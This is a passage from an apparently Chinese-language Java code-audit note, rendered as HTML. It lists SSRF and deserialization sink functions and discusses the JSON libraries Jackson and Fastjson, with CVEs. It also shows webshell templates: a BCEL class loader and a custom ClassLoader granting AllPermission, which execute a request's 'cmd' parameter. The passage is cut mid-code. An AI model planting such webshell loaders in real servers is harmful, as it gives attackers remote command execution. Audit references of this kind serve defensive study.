</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">35</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">org</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">sax</span>.<span class="cm-variable">XMLReader</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 793px;"></div><div class="CodeMirror-gutters" style="height: 793px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></li></ul><h4 id='ssrf-3'><span>SSRF</span></h4><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>17</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">HttpClient</span>.<span class="cm-variable">execute</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">HttpClients</span>.<span class="cm-variable">execute</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">HttpURLConnection</span>.<span class="cm-variable">getInputStream</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">ImageIO</span>.<span class="cm-variable">read</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">OkHttpClient</span>.<span class="cm-variable">newCall</span>.<span class="cm-variable">execute</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">Request</span>.<span class="cm-variable">Get</span>.<span class="cm-variable">execute</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">Request</span>.<span class="cm-variable">Post</span>.<span class="cm-variable">execute</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">URL</span>.<span class="cm-variable">openStream</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">URLConnection</span>.<span class="cm-variable">getInputStream</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 385px;"></div><div class="CodeMirror-gutters" style="height: 385px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></li></ul><h4 id='反序列化-6'><span>反序列化</span></h4><h5 id='相关-sink-函数'><span>相关 Sink 函数</span></h5><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>13</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">JSON</span>.<span class="cm-variable">parseObject</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">ObjectInputStream</span>.<span class="cm-variable">readObject</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">ObjectInputStream</span>.<span class="cm-variable">readUnshared</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">ObjectMapper</span>.<span class="cm-variable">readValue</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">XMLDecoder</span>.<span class="cm-variable">readObject</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">XStream</span>.<span class="cm-variable">fromXML</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">Yaml</span>.<span class="cm-variable">load</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 295px;"></div><div class="CodeMirror-gutters" style="height: 295px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></li></ul><h5 id='magic-call'><span>Magic Call</span></h5><blockquote><p><span>以下的魔术方法都会在反序列化过程中被自动的调用。</span></p></blockquote><ul><li><span>readObject</span></li><li><span>readExternal</span></li><li><span>readResolve</span></li><li><span>readObjectNoData</span></li><li><span>validateObject</span></li><li><span>finalize</span></li></ul><h4 id='主流-json-库'><span>主流 JSON 库</span></h4><blockquote><p><span>主流的 JSON 库有 Gson、Jackson、Fastjson 等，因为 JSON 常在反序列化中使用，所以相关库都有较大的影响。</span></p><p><span>其中 Gson 默认只能反序列化基本类型，如果是复杂类型，需要程序员实现反序列化机制，相对比较安全。</span></p><p><span>Jackson 除非指明 @jsonAutoDetect，Jackson 不会反序列化非 public 属性。在防御时，可以不使用 enableDe- faultTyping 方法。相关 CVE 有 CVE-2017-7525、CVE-2017-15095。</span></p><p><span>FastJson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也支持从 JSON 字符串反序列化到 Java Bean，相关 CVE 有 CVE-2017-18349 等。</span></p><p><span>FastJson 常见的 Sink 点有：</span></p></blockquote><ul><li><span>JSON.toJSONString</span></li><li><span>JSON.parseObject</span></li><li><span>JSON.parse</span></li></ul><h3 id='webshell-3'><span>WebShell</span></h3><h4 id='bcel-字节码'><span>BCEL 字节码</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-3">String</span> <span class="cm-variable">bcelCode</span><span class="cm-operator">=</span><span class="cm-string">"..."</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">response</span>.<span class="cm-variable">getOutputStream</span>().<span class="cm-variable">write</span>(<span class="cm-variable-3">String</span>.<span class="cm-variable">valueOf</span>(<span class="cm-variable">newClassLoader</span>().<span class="cm-variable">loadClass</span>(<span class="cm-variable">bcelCode</span>).<span class="cm-variable">getConstructor</span>(<span class="cm-variable-3">String</span>.<span class="cm-keyword">class</span>).<span class="cm-variable">newInstance</span>(<span class="cm-variable">request</span>.<span class="cm-variable">getParameter</span>(<span class="cm-string">"cmd"</span>)).<span class="cm-variable">toString</span>()).<span class="cm-variable">getBytes</span>());</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='自定义类加载器'><span>自定义类加载器</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>24</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">response</span>.<span class="cm-variable">getOutputStream</span>().<span class="cm-variable">write</span>(<span class="cm-variable">newClassLoader</span>(){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-meta">@Override</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable">Class</span><span class="cm-operator">&lt;?&gt;</span> <span class="cm-variable">loadClass</span>(<span class="cm-variable">Stringname</span>) <span class="cm-keyword">throws</span> <span class="cm-variable">ClassNotFoundException</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span>(<span class="cm-variable">name</span>.<span class="cm-variable">contains</span>(<span class="cm-string">"shell"</span>)){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">findClass</span>(<span class="cm-variable">name</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-keyword">super</span>.<span class="cm-variable">loadClass</span>(<span class="cm-variable">name</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-meta">@Override</span> </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">protected</span> <span class="cm-variable">Class</span><span class="cm-operator">&lt;?&gt;</span> <span class="cm-variable">findClass</span>(<span class="cm-variable">Stringname</span>) <span class="cm-keyword">throws</span> <span class="cm-variable">ClassNotFoundException</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">try</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-3">byte</span>[] <span class="cm-variable">bytes</span><span class="cm-operator">=</span><span class="cm-variable">Base64</span>.<span class="cm-variable">getDecoder</span>().<span class="cm-variable">decode</span>(<span class="cm-string">"..."</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">PermissionCollection</span> <span class="cm-variable">pc</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-variable">Permissions</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">pc</span>.<span class="cm-variable">add</span>(<span class="cm-variable">newAllPermission</span>()); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ProtectionDomain</span> <span class="cm-variable">protectionDomain</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-variable">ProtectionDomain</span>(<span class="cm-variable">newCodeSource</span>(<span class="cm-atom">null</span>,(<span class="cm-variable">Certificate</span>[]) <span class="cm-atom">null</span>), <span class="cm-variable">pc</span>, <span class="cm-keyword">this</span>,<span class="cm-atom">null</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-keyword">this</span>.<span class="cm-variable">defineClass</span>(<span class="cm-variable">name</span>,<span class="cm-variable">bytes</span>,<span class="cm-number">0</span>, <span class="cm-variable">bytes</span>.<span class="cm-variable">length</span>, <span class="cm-variable">protectionDomain</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">catch</span>(<span class="cm-variable">Exceptione</span>){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">e</span>.<span class="cm-variable">printStackTrace</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span 